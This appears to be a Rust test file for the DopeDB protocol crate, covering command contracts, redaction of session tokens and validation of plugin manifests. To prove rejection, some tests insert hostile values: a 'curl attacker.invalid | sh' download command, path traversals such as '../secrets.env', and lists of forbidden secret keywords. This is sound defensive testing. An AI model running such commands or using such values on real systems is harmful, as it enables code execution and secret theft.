use dopedb_protocol::{
    catalog::CatalogSnapshot, decode_arguments, AcpPluginArtifact, AcpPluginCompatibility,
    AcpPluginId, AcpPluginLicense, AcpPluginManifestV1, AcpPluginProvider, AcpPluginUpstream,
    AgentSessionRegisterArguments, AppOpenCommand, AppOpenResult, AuthenticationRequirement,
    CatalogSearchCommand, CatalogShowCommand, CommandName, CommandSpec, ConnectionListCommand,
    ConnectionShowCommand, ConnectionTestCommand, DashboardCreateCommand, DatabaseListCommand,
    DocumentRunCommand, ErrorCode, FunnelDashboardListCommand, FunnelDashboardProposeCommand,
    GraphBuildArtifactV1, OperationCancelCommand, OperationShowCommand, OperationWaitCommand,
    ProtocolError, QueryCancelCommand, QueryPlanCommand, QueryRunCommand,
    ReportAppendEvidenceCommand, ReportProposeCommand, RequestEnvelope, ResponseEnvelope,
    RuntimeDiscovery, SchemaListCommand, SessionAuthentication, SignalEvaluationReceiptV1,
    SignalRuleDefinitionV1, SignedAcpPluginManifestV1, SkillInstallCommand, SkillRemoveCommand,
    SkillRepairCommand, SkillStatusCommand, SkillsGetCommand, SkillsListCommand, SqlProposeCommand,
    StatusCommand, StatusResult, TableDescribeCommand, VersionCommand, VersionResult,
    ACP_PLUGIN_MANIFEST_SCHEMA_VERSION, COMMAND_SCHEMA_VERSION,
    GRAPH_BUILD_ARTIFACT_SCHEMA_VERSION, PROTOCOL_MAX,
};
use serde::Deserialize;
use serde_json::{json, Value};

fn value(source: &str) -> Value {
    serde_json::from_str(source).expect("fixture must be valid JSON")
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct CliCommandContract {
    command: CommandName,
    arguments: Value,
    #[serde(default)]
    result: Option<Value>,
    #[serde(default)]
    result_fixture: Option<String>,
}

fn typed_cli_contract<C: CommandSpec>(request: &RequestEnvelope, result: &Value) {
    typed_contract::<C>(request, result, AuthenticationRequirement::TerminalSession);
}

fn typed_public_contract<C: CommandSpec>(request: &RequestEnvelope, result: &Value) {
    typed_contract::<C>(request, result, AuthenticationRequirement::None);
}

fn typed_contract<C: CommandSpec>(
    request: &RequestEnvelope,
    result: &Value,
    authentication: AuthenticationRequirement,
) {
    assert_eq!(C::AUTHENTICATION, authentication);
    let arguments = decode_arguments::<C>(request).expect("typed command arguments");
    assert_eq!(serde_json::to_value(arguments).unwrap(), request.arguments);
    let typed_result: C::Result =
        serde_json::from_value(result.clone()).expect("typed command result");
    assert_eq!(serde_json::to_value(typed_result).unwrap(), *result);
}

fn operation_summary_fixture() -> Value {
    json!({
        "operationId": "00000000-0000-0000-0000-000000000003",
        "connectionId": "00000000-0000-0000-0000-000000000001",
        "kind": "write_sql",
        "state": "pending_approval",
        "riskLevel": "medium",
        "payloadHash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "expiresAt": "2026-07-24T00:05:00Z",
        "createdAt": "2026-07-24T00:00:00Z",
        "updatedAt": "2026-07-24T00:00:00Z"
    })
}

fn resolve_result_fixture(contract: &CliCommandContract) -> Value {
    if let Some(result) = &contract.result {
        return result.clone();
    }
    match contract.result_fixture.as_deref() {
        Some("catalog-snapshot-v2") => value(include_str!("fixtures/catalog-snapshot-v2.json")),
        Some("database-list") => json!({
            "connectionId": "00000000-0000-0000-0000-000000000001",
            "databases": [
                {"name": "analytics", "isDefault": false},
                {"name": "app", "isDefault": true}
            ]
        }),
        Some("catalog-relation-0") => {
            let catalog = value(include_str!("fixtures/catalog-snapshot-v2.json"));
            json!({
                "connectionId": catalog["connectionId"],
                "database": catalog["database"],
                "relation": catalog["relations"][0]
            })
        }
        Some("operation-summary") => operation_summary_fixture(),
        Some("funnel-analysis") => json!({
            "artifact": funnel_analysis_fixture()
        }),
        Some("funnel-analysis-list") => json!([funnel_analysis_fixture()]),
        Some("skills-list") => json!({
            "skills": [skill_summary_fixture()]
        }),
        Some("skills-get") => json!({
            "skill": skill_summary_fixture(),
            "guide": "# DopeDB CLI\n",
            "references": [
                {
                    "path": "references/safety.md",
                    "content": "# Safety\n"
                }
            ]
        }),
        Some("skill-status") => skill_status_fixture(),
        Some("skill-mutation") => json!({
            "status": skill_status_fixture(),
            "changedTargets": [],
            "backups": []
        }),
        fixture => panic!("unknown result fixture {fixture:?}"),
    }
}

fn funnel_analysis_fixture() -> Value {
    json!({
        "id": "00000000-0000-0000-0000-000000000130",
        "projectEnvironmentId": "00000000-0000-0000-0000-000000000129",
        "environmentRevision": 3,
        "knowledgeGrantId": "00000000-0000-0000-0000-000000000126",
        "graphRevisionIds": ["00000000-0000-0000-0000-000000000127"],
        "sourceAgent": "dopedb.acp.codex",
        "title": "Activation funnel",
        "question": "Where do new accounts stop?",
        "purpose": "Track verified activation conversion.",
        "timezone": "Asia/Seoul",
        "timeRange": "Last 7 days",
        "segmentFilters": ["All new accounts"],
        "conversionWindowSeconds": 604800,
        "denominatorSemantics": "Distinct accounts created in the window.",
        "numeratorSemantics": "Distinct accounts completing the next ordered step.",
        "deduplicationPolicy": "Keep the first event for each account and step.",
        "lateEventPolicy": "Recompute the open conversion window.",
        "steps": [{
            "id": "signup",
            "label": "Signed up",
            "meaning": "An account was created.",
            "connectionRole": "identity",
            "entityKey": "account_id",
            "timestampField": "created_at",
            "orderingRule": "First event per account.",
            "mappingState": "inferred",
            "graphNodeIds": ["aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"],
            "evidenceIds": ["bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"]
        }],
        "tiles": [{
            "definition": {
                "id": "signup-metric",
                "title": "Signups",
                "kind": "metric",
                "dashboardId": "00000000-0000-0000-0000-000000000006",
                "expectedDashboardRevision": 1,
                "queryRunId": "00000000-0000-0000-0000-000000000007",
                "stepIds": ["signup"]
            },
            "dashboard": {
                "id": "00000000-0000-0000-0000-000000000006",
                "connectionId": "00000000-0000-0000-0000-000000000001",
                "revision": 1,
                "title": "Active users",
                "description": "Current active-user view",
                "sql": "SELECT id, email FROM public.users",
                "visualization": { "version": 1, "kind": "auto", "yColumns": [] },
                "createdAt": "2026-07-24T00:00:00Z",
                "updatedAt": "2026-07-24T00:00:00Z"
            },
            "connectionRevision": 2,
            "availability": "ready"
        }],
        "warnings": ["Contains inferred mappings that require human review before publish."],
        "freshness": "current",
        "state": "draft",
        "revision": 1,
        "createdAt": "2026-07-24T00:00:00Z",
        "updatedAt": "2026-07-24T00:00:00Z"
    })
}

fn skill_summary_fixture() -> Value {
    json!({
        "name": "dopedb-cli",
        "releaseRevision": 2,
        "appVersion": "0.3.3",
        "packageDigest": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
    })
}

fn skill_status_fixture() -> Value {
    json!({
        "skill": skill_summary_fixture(),
        "targets": [
            {
                "target": "codex",
                "displayName": "Codex",
                "installPath": "/home/user/.agents/skills/dopedb-cli",
                "state": "missing",
                "repairable": true,
                "currentRevision": 2,
                "installedRevision": null,
                "installedPackageDigest": null,
                "inventoryFingerprint": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                "reason": null,
                "conflicts": []
            },
            {
                "target": "claude-code",
                "displayName": "Claude Code",
                "installPath": "/home/user/.claude/skills/dopedb-cli",
                "state": "managed_current",
                "repairable": true,
                "currentRevision": 2,
                "installedRevision": 2,
                "installedPackageDigest": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
                "inventoryFingerprint": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
                "reason": null,
                "conflicts": []
            }
        ]
    })
}

fn assert_cli_command_types(command: CommandName, request: &RequestEnvelope, result: &Value) {
    match command {
        CommandName::ConnectionList => typed_cli_contract::<ConnectionListCommand>(request, result),
        CommandName::ConnectionShow => typed_cli_contract::<ConnectionShowCommand>(request, result),
        CommandName::ConnectionTest => typed_cli_contract::<ConnectionTestCommand>(request, result),
        CommandName::DatabaseList => typed_cli_contract::<DatabaseListCommand>(request, result),
        CommandName::CatalogShow => typed_cli_contract::<CatalogShowCommand>(request, result),
        CommandName::SchemaList => typed_cli_contract::<SchemaListCommand>(request, result),
        CommandName::TableDescribe => typed_cli_contract::<TableDescribeCommand>(request, result),
        CommandName::DocumentRun => typed_cli_contract::<DocumentRunCommand>(request, result),
        CommandName::QueryPlan => typed_cli_contract::<QueryPlanCommand>(request, result),
        CommandName::QueryRun => typed_cli_contract::<QueryRunCommand>(request, result),
        CommandName::QueryCancel => typed_cli_contract::<QueryCancelCommand>(request, result),
        CommandName::DashboardCreate => {
            typed_cli_contract::<DashboardCreateCommand>(request, result)
        }
        CommandName::FunnelDashboardPropose => {
            typed_cli_contract::<FunnelDashboardProposeCommand>(request, result)
        }
        CommandName::FunnelDashboardList => {
            typed_cli_contract::<FunnelDashboardListCommand>(request, result)
        }
        CommandName::ReportPropose => typed_cli_contract::<ReportProposeCommand>(request, result),
        CommandName::ReportAppendEvidence => {
            typed_cli_contract::<ReportAppendEvidenceCommand>(request, result)
        }
        CommandName::SqlPropose => typed_cli_contract::<SqlProposeCommand>(request, result),
        CommandName::OperationShow => typed_cli_contract::<OperationShowCommand>(request, result),
        CommandName::OperationWait => typed_cli_contract::<OperationWaitCommand>(request, result),
        CommandName::OperationCancel => {
            typed_cli_contract::<OperationCancelCommand>(request, result)
        }
        CommandName::SkillsList => typed_public_contract::<SkillsListCommand>(request, result),
        CommandName::SkillsGet => typed_public_contract::<SkillsGetCommand>(request, result),
        CommandName::SkillStatus => typed_public_contract::<SkillStatusCommand>(request, result),
        CommandName::SkillInstall => typed_public_contract::<SkillInstallCommand>(request, result),
        CommandName::SkillRepair => typed_public_contract::<SkillRepairCommand>(request, result),
        CommandName::SkillRemove => typed_public_contract::<SkillRemoveCommand>(request, result),
        unsupported => panic!("manifest contains unsupported command {unsupported}"),
    }
}

#[test]
fn query_plan_request_matches_v12_command_schema_and_pinned_agent_registration() {
    let source = include_str!("fixtures/query-plan-request.json");
    let request: RequestEnvelope =
        serde_json::from_str(source).expect("request fixture must decode");

    assert_eq!(request.protocol_version, PROTOCOL_MAX);
    assert_eq!(request.command_schema_version, COMMAND_SCHEMA_VERSION);
    assert_eq!(request.command.as_str(), "query.plan");
    assert_eq!(serde_json::to_value(&request).unwrap(), value(source));

    let debug = format!("{request:?}");
    assert!(debug.contains("<redacted>"));
    assert!(!debug.contains("fixture-only-session-capability"));

    let process_bound = SessionAuthentication::process_bound(uuid::Uuid::nil());
    let serialized = serde_json::to_value(process_bound).unwrap();
    assert_eq!(
        serialized["terminalSessionId"],
        uuid::Uuid::nil().to_string()
    );
    assert!(serialized.get("token").is_none());

    let registration = AgentSessionRegisterArguments {
        plugin_id: AcpPluginId::Claude,
        adapter_bundle_version: "1.0.0".into(),
        runtime_executable: "/Applications/DopeDB.app/Resources/node".into(),
        runtime_resolved_executable: "/Applications/DopeDB.app/Resources/node".into(),
        runtime_sha256: "ab".repeat(32),
        adapter_entrypoint: "/Users/test/acp/claude/1.0.0/index.js".into(),
        adapter_entrypoint_sha256: "cd".repeat(32),
        provider_cli_executable: "/opt/homebrew/bin/claude".into(),
        provider_cli_resolved_executable: "/opt/homebrew/lib/node_modules/claude/cli.js".into(),
        provider_cli_sha256: "ef".repeat(32),
    };
    assert!(registration.validate());
    assert_eq!(
        AcpPluginId::parse("dopedb.acp.claude"),
        Some(registration.plugin_id)
    );
    assert_eq!(AcpPluginId::parse("claude"), None);
    assert_eq!(AcpPluginId::parse("attacker.plugin"), None);
    assert_eq!(
        registration.plugin_id.local_cli_environment(),
        "CLAUDE_CODE_EXECUTABLE"
    );
    assert_eq!(AcpPluginId::Codex.local_cli_environment(), "CODEX_PATH");
    let mut registration_json = serde_json::to_value(&registration).unwrap();
    registration_json["package"] = json!("attacker/package@latest");
    assert!(serde_json::from_value::<AgentSessionRegisterArguments>(registration_json).is_err());
    let mut invalid_digest = registration;
    invalid_digest.runtime_sha256 = "AB".repeat(32);
    assert!(!invalid_digest.validate());

    let manifest = AcpPluginManifestV1 {
        schema_version: ACP_PLUGIN_MANIFEST_SCHEMA_VERSION,
        plugin_id: AcpPluginId::Claude,
        provider: AcpPluginProvider::Claude,
        adapter_version: "0.63.0".into(),
        adapter_bundle_version: "1.0.0".into(),
        adapter_entrypoint: "dist/index.js".into(),
        upstream: AcpPluginUpstream {
            repository: "https://github.com/agentclientprotocol/claude-agent-acp".into(),
            tag: "v0.63.0".into(),
            commit: "ab".repeat(20),
        },
        compatibility: AcpPluginCompatibility {
            acp_protocol_min: "2025-11-25".into(),
            acp_protocol_max: "2025-11-25".into(),
            node_version_min: "24.0.0".into(),
            node_version_max: "24.99.99".into(),
            dopedb_version_min: "0.3.33".into(),
            dopedb_version_max: "0.3.99".into(),
        },
        artifact: AcpPluginArtifact {
            url: "https://github.com/json-choi/dopedb/releases/download/acp-bundle-1/claude.tar.gz"
                .into(),
            sha256: "cd".repeat(32),
            signature: "fixture-signature".into(),
            key_id: "dopedb-acp-1".into(),
            packed_bytes: 1024,
            unpacked_bytes: 4096,
        },
        licenses: vec![AcpPluginLicense {
            name: "Apache-2.0".into(),
            path: "licenses/NOTICE.txt".into(),
        }],
        sbom_sha256: "ef".repeat(32),
        content_sha256: "de".repeat(32),
        released_at: "2026-08-08T00:00:00Z".into(),
        revoked_at: None,
        rollout_basis_points: 1_000,
    };
    assert!(manifest.validate());
    let signed = SignedAcpPluginManifestV1 {
        manifest: manifest.clone(),
        manifest_sha256: "12".repeat(32),
        signature: "fixture-manifest-signature".into(),
        key_id: "dopedb-acp-1".into(),
    };
    assert!(signed.validate_shape());
    let mut signed_json = serde_json::to_value(&signed).unwrap();
    assert_eq!(
        signed_json["manifest"]["pluginId"],
        json!("dopedb.acp.claude")
    );
    signed_json["downloadCommand"] = json!("curl attacker.invalid | sh");
    assert!(serde_json::from_value::<SignedAcpPluginManifestV1>(signed_json).is_err());
    let mut unknown_provider = manifest.clone();
    unknown_provider.provider = AcpPluginProvider::Codex;
    assert!(!unknown_provider.validate());
    let mut traversal = manifest.clone();
    traversal.adapter_entrypoint = "../adapter.js".into();
    assert!(!traversal.validate());
    let mut oversized = manifest;
    oversized.artifact.packed_bytes = 31 * 1024 * 1024;
    assert!(!oversized.validate());
    oversized.artifact.packed_bytes = 1024;
    oversized.compatibility.node_version_min = "25.0.0".into();
    assert!(!oversized.validate());

    let graph_source = include_str!("fixtures/graph-build-artifact-v1.json");
    let graph: GraphBuildArtifactV1 =
        serde_json::from_str(graph_source).expect("knowledge artifact fixture must decode");
    assert_eq!(graph.schema_version, GRAPH_BUILD_ARTIFACT_SCHEMA_VERSION);
    assert!(graph.validate());
    assert_eq!(serde_json::to_value(&graph).unwrap(), value(graph_source));
    let mut unsafe_graph = serde_json::to_value(graph).unwrap();
    unsafe_graph["evidence"][0]["filePath"] = json!("../secrets.env");
    let unsafe_graph: GraphBuildArtifactV1 = serde_json::from_value(unsafe_graph).unwrap();
    assert!(!unsafe_graph.validate());

    let signal_rule: SignalRuleDefinitionV1 = serde_json::from_value(json!({
        "schemaVersion": 1,
        "ruleId": "00000000-0000-0000-0000-000000000131",
        "projectEnvironmentId": "00000000-0000-0000-0000-000000000129",
        "environmentRevision": 3,
        "sourceAnalysisId": "00000000-0000-0000-0000-000000000130",
        "sourceAnalysisRevision": 1,
        "sourceTileId": "signup-metric",
        "metricSemanticId": "signup_count",
        "connectionIds": ["00000000-0000-0000-0000-000000000001"],
        "schedule": "*/15 * * * *",
        "timezone": "Asia/Seoul",
        "evaluationWindowSeconds": 3600,
        "condition": {"kind": "percentage_change", "percentage": 20.0},
        "baselineWindowSeconds": 86400,
        "minimumSampleCount": 10,
        "cooldownSeconds": 3600,
        "rearmAfterNormalCount": 2,
        "severity": "warning",
        "recipientMemberIds": ["member-1"],
        "channels": ["desktop", "workspace_web", "email"],
        "enabled": true,
        "revision": 1,
        "productionApprovedByMemberId": null,
        "productionApprovedAt": null
    }))
    .expect("Signal rule fixture must decode");
    assert!(signal_rule.validate());
    let mut invalid_rule = signal_rule.clone();
    invalid_rule.baseline_window_seconds = None;
    assert!(!invalid_rule.validate());
    let serialized_rule = serde_json::to_string(&signal_rule).unwrap();
    for forbidden in ["password", "credential", "hostname", "sql", "resultRows"] {
        assert!(!serialized_rule
            .to_ascii_lowercase()
            .contains(&forbidden.to_ascii_lowercase()));
    }

    let receipt: SignalEvaluationReceiptV1 = serde_json::from_value(json!({
        "receiptId": "00000000-0000-0000-0000-000000000132",
        "ruleId": "00000000-0000-0000-0000-000000000131",
        "ruleRevision": 1,
        "projectEnvironmentId": "00000000-0000-0000-0000-000000000129",
        "environmentRevision": 3,
        "runnerDeviceId": "device-1",
        "scheduledAt": "2026-08-08T00:00:00Z",
        "evaluatedAt": "2026-08-08T00:00:01Z",
        "state": "firing",
        "queryRunIds": ["00000000-0000-0000-0000-000000000133"],
        "connectionIds": ["00000000-0000-0000-0000-000000000001"],
        "durationMs": 1000,
        "rowCountCategory": "one",
        "schemaFingerprint": "ab".repeat(32),
        "dedupeKey": "rule-1:revision-1:schedule-1",
        "transitionSequence": 1,
        "errorKind": null
    }))
    .expect("Signal receipt fixture must decode");
    assert!(receipt.validate());
    let mut unsafe_receipt = serde_json::to_value(receipt).unwrap();
    unsafe_receipt["resultRows"] = json!([[42]]);
    assert!(serde_json::from_value::<SignalEvaluationReceiptV1>(unsafe_receipt).is_err());
}

#[test]
fn every_phase_six_cli_command_has_request_success_error_and_redaction_goldens() {
    let contracts: Vec<CliCommandContract> =
        serde_json::from_str(include_str!("fixtures/cli-command-contract-v3.json"))
            .expect("CLI command manifest must decode");
    let expected = [
        CommandName::ConnectionList,
        CommandName::ConnectionShow,
        CommandName::ConnectionTest,
        CommandName::DatabaseList,
        CommandName::CatalogShow,
        CommandName::SchemaList,
        CommandName::TableDescribe,
        CommandName::DocumentRun,
        CommandName::QueryPlan,
        CommandName::QueryRun,
        CommandName::QueryCancel,
        CommandName::DashboardCreate,
        CommandName::FunnelDashboardPropose,
        CommandName::FunnelDashboardList,
        CommandName::ReportPropose,
        CommandName::ReportAppendEvidence,
        CommandName::SqlPropose,
        CommandName::OperationShow,
        CommandName::OperationWait,
        CommandName::OperationCancel,
    ];
    assert_eq!(
        contracts
            .iter()
            .map(|contract| contract.command)
            .collect::<Vec<_>>(),
        expected
    );

    for (index, contract) in contracts.iter().enumerate() {
        let request_id =
            uuid::Uuid::from_u128(0x018f_1111_2222_7333_8444_5555_0000_0000 + index as u128);
        let request_value = json!({
            "protocolVersion": PROTOCOL_MAX,
            "commandSchemaVersion": COMMAND_SCHEMA_VERSION,
            "requestId": request_id,
            "authentication": {
                "terminalSessionId": "018faaaa-bbbb-7ccc-8ddd-eeeeeeeeeeee",
                "token": "fixture-only-session-capability"
            },
            "command": contract.command,
            "arguments": contract.arguments
        });
        let request: RequestEnvelope =
            serde_json::from_value(request_value.clone()).expect("golden request envelope");
        assert_eq!(serde_json::to_value(&request).unwrap(), request_value);

        let result = resolve_result_fixture(contract);
        assert_cli_command_types(contract.command, &request, &result);
        let success = ResponseEnvelope::success(PROTOCOL_MAX, request_id, result);
        let success_value = serde_json::to_value(&success).unwrap();
        let success_round_trip: ResponseEnvelope =
            serde_json::from_value(success_value.clone()).expect("golden success envelope");
        assert!(success_round_trip.is_ok());
        assert_eq!(
            serde_json::to_value(&success_round_trip).unwrap(),
            success_value
        );

        let error = ResponseEnvelope::failure(
            PROTOCOL_MAX,
            request_id,
            ProtocolError::new(ErrorCode::ScopeDenied, false),
        );
        let error_value = serde_json::to_value(&error).unwrap();
        let error_round_trip: ResponseEnvelope =
            serde_json::from_value(error_value.clone()).expect("golden error envelope");
        assert_eq!(
            error_round_trip.error().map(ProtocolError::code),
            Some(ErrorCode::ScopeDenied)
        );
        assert_eq!(
            serde_json::to_value(&error_round_trip).unwrap(),
            error_value
        );

        let request_debug = format!("{request:?}");
        let success_debug = format!("{success:?}");
        assert!(!request_debug.contains("fixture-only-session-capability"));
        assert!(!request_debug.contains("SELECT id"));
        assert!(!success_debug.contains("reader@example.test"));
        assert!(!success_debug.contains("aaaaaaaaaaaaaaaa"));

        let safe_response_snapshot = success_value.to_string().to_ascii_lowercase();
        for forbidden in [
            "fixture-only-session-capability",
            "postgresql://",
            "\"password\"",
            "\"credential\"",
            "\"token\"",
        ] {
            assert!(
                !safe_response_snapshot.contains(forbidden),
                "{} success snapshot contains forbidden material {forbidden}",
                contract.command
            );
        }
    }
}

#[test]
fn every_phase_four_skill_command_has_public_versioned_goldens() {
    let contracts: Vec<CliCommandContract> =
        serde_json::from_str(include_str!("fixtures/skill-command-contract-v1.json"))
            .expect("Skill command manifest must decode");
    let expected = [
        CommandName::SkillsList,
        CommandName::SkillsGet,
        CommandName::SkillStatus,
        CommandName::SkillInstall,
        CommandName::SkillRepair,
        CommandName::SkillRemove,
    ];
    assert_eq!(
        contracts
            .iter()
            .map(|contract| contract.command)
            .collect::<Vec<_>>(),
        expected
    );

    for (index, contract) in contracts.iter().enumerate() {
        let request_id =
            uuid::Uuid::from_u128(0x018f_4444_2222_7333_8444_5555_0000_0000 + index as u128);
        let request_value = json!({
            "protocolVersion": PROTOCOL_MAX,
            "commandSchemaVersion": COMMAND_SCHEMA_VERSION,
            "requestId": request_id,
            "command": contract.command,
            "arguments": contract.arguments
        });
        let request: RequestEnvelope =
            serde_json::from_value(request_value.clone()).expect("Skill request envelope");
        assert!(request.authentication.is_none());
        let result = resolve_result_fixture(contract);
        assert_cli_command_types(contract.command, &request, &result);

        let response = ResponseEnvelope::success(PROTOCOL_MAX, request_id, result);
        response.validate().expect("Skill response invariant");
        let snapshot = serde_json::to_string(&response).unwrap();
        for forbidden in [
            "password",
            "credential",
            "session-capability",
            "postgresql://",
        ] {
            assert!(!snapshot.to_ascii_lowercase().contains(forbidden));
        }
    }
}

#[test]
fn active_app_commands_match_the_v1_golden_contract() {
    let version_request_source = include_str!("fixtures/version-request.json");
    let version_request: RequestEnvelope =
        serde_json::from_str(version_request_source).expect("version request must decode");
    decode_arguments::<VersionCommand>(&version_request).expect("typed version request");
    assert_eq!(
        serde_json::to_value(&version_request).unwrap(),
        value(version_request_source)
    );

    let status_request_source = include_str!("fixtures/status-request.json");
    let status_request: RequestEnvelope =
        serde_json::from_str(status_request_source).expect("status request must decode");
    decode_arguments::<StatusCommand>(&status_request).expect("typed status request");
    assert_eq!(
        serde_json::to_value(&status_request).unwrap(),
        value(status_request_source)
    );

    let app_open_request_source = include_str!("fixtures/app-open-request.json");
    let app_open_request: RequestEnvelope =
        serde_json::from_str(app_open_request_source).expect("app open request must decode");
    decode_arguments::<AppOpenCommand>(&app_open_request).expect("typed app open request");
    assert_eq!(
        serde_json::to_value(&app_open_request).unwrap(),
        value(app_open_request_source)
    );

    let version_success_source = include_str!("fixtures/version-success.json");
    let version_success: ResponseEnvelope =
        serde_json::from_str(version_success_source).expect("version response must decode");
    let _: VersionResult =
        serde_json::from_value(version_success.result().cloned().unwrap()).unwrap();
    assert_eq!(
        serde_json::to_value(&version_success).unwrap(),
        value(version_success_source)
    );

    let status_success_source = include_str!("fixtures/status-success.json");
    let status_success: ResponseEnvelope =
        serde_json::from_str(status_success_source).expect("status response must decode");
    let _: StatusResult =
        serde_json::from_value(status_success.result().cloned().unwrap()).unwrap();
    assert_eq!(
        serde_json::to_value(&status_success).unwrap(),
        value(status_success_source)
    );

    let app_open_success_source = include_str!("fixtures/app-open-success.json");
    let app_open_success: ResponseEnvelope =
        serde_json::from_str(app_open_success_source).expect("app open response must decode");
    let _: AppOpenResult =
        serde_json::from_value(app_open_success.result().cloned().unwrap()).unwrap();
    assert_eq!(
        serde_json::to_value(&app_open_success).unwrap(),
        value(app_open_success_source)
    );

    for source in [
        include_str!("fixtures/app-open-error.json"),
        include_str!("fixtures/version-error.json"),
        include_str!("fixtures/status-error.json"),
        include_str!("fixtures/policy-blocked.json"),
    ] {
        let response: ResponseEnvelope =
            serde_json::from_str(source).expect("response fixture must decode");
        response.validate().expect("response invariant");
        assert_eq!(serde_json::to_value(&response).unwrap(), value(source));
    }
}

#[test]
fn runtime_discovery_matches_the_secret_free_v1_contract() {
    let source = include_str!("fixtures/runtime-discovery.json");
    let discovery: RuntimeDiscovery =
        serde_json::from_str(source).expect("runtime discovery must decode");
    discovery.validate().expect("runtime discovery invariant");
    assert_eq!(serde_json::to_value(&discovery).unwrap(), value(source));

    let serialized = serde_json::to_string(&discovery).unwrap();
    for forbidden in [
        "token",
        "password",
        "credential",
        "database",
        "workspace",
        "connection",
    ] {
        assert!(!serialized.to_ascii_lowercase().contains(forbidden));
    }
}

#[test]
fn unknown_envelope_and_active_command_fields_fail_closed() {
    let mut fixture = value(include_str!("fixtures/query-plan-request.json"));
    fixture
        .as_object_mut()
        .unwrap()
        .insert("approved".into(), Value::Bool(true));
    assert!(serde_json::from_value::<RequestEnvelope>(fixture).is_err());

    let mut status = value(include_str!("fixtures/status-request.json"));
    status["arguments"]["approved"] = Value::Bool(true);
    let request: RequestEnvelope = serde_json::from_value(status).unwrap();
    assert!(decode_arguments::<StatusCommand>(&request).is_err());

    let future: RequestEnvelope = serde_json::from_value(serde_json::json!({
        "protocolVersion": 1,
        "commandSchemaVersion": 5,
        "requestId": "018f1111-2222-7333-8444-555566667777",
        "command": "future.command",
        "arguments": {"approved": true}
    }))
    .unwrap();
    assert_eq!(future.command, dopedb_protocol::CommandName::Unknown);
}

#[test]
fn command_names_match_the_v12_catalog() {
    let actual = dopedb_protocol::CommandName::ALL
        .into_iter()
        .map(|command| command.as_str())
        .collect::<Vec<_>>();
    let expected: Vec<String> =
        serde_json::from_str(include_str!("fixtures/command-catalog-v12.json")).unwrap();
    assert_eq!(actual, expected);

    let request: RequestEnvelope = serde_json::from_value(json!({
        "protocolVersion": PROTOCOL_MAX,
        "commandSchemaVersion": COMMAND_SCHEMA_VERSION,
        "requestId": "018f1111-2222-7333-8444-555566667777",
        "authentication": {
            "terminalSessionId": "018faaaa-bbbb-7ccc-8ddd-eeeeeeeeeeee"
        },
        "command": "catalog.search",
        "arguments": {
            "connection": "current",
            "database": "app",
            "query": "user",
            "kinds": ["table"],
            "limit": 20
        }
    }))
    .expect("catalog search request must decode");
    let result = json!({
        "connectionId": "00000000-0000-0000-0000-000000000001",
        "engine": "postgres",
        "database": "app",
        "capturedAt": "2026-07-24T00:00:00Z",
        "fingerprint": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "query": "user",
        "totalMatches": 1,
        "truncated": false,
        "matches": [{
            "matchType": "relation",
            "qualifiedName": "app.public.users",
            "object": {
                "catalog": "app",
                "namespace": "public",
                "name": "users",
                "kind": "table"
            },
            "matchedFields": ["deleted_at"]
        }]
    });
    typed_cli_contract::<CatalogSearchCommand>(&request, &result);
}

#[test]
fn catalog_snapshot_matches_the_v2_golden_contract() {
    let source = include_str!("fixtures/catalog-snapshot-v2.json");
    let snapshot: CatalogSnapshot =
        serde_json::from_str(source).expect("Catalog V2 fixture must decode");

    assert_eq!(snapshot.schema_version(), 2);
    assert!(snapshot.has_canonical_fingerprint());
    assert_eq!(serde_json::to_value(&snapshot).unwrap(), value(source));

    let mut structural_tamper = value(source);
    structural_tamper["relations"][0]["columns"][0]["nativeType"] = Value::from("text");
    assert!(serde_json::from_value::<CatalogSnapshot>(structural_tamper).is_err());

    let mut non_structural_change = value(source);
    non_structural_change["database"] = Value::from("production");
    non_structural_change["relations"][0]["rowEstimate"] = Value::from(43);
    let changed: CatalogSnapshot =
        serde_json::from_value(non_structural_change).expect("display metadata is not schema");
    assert_eq!(changed.fingerprint(), snapshot.fingerprint());
}
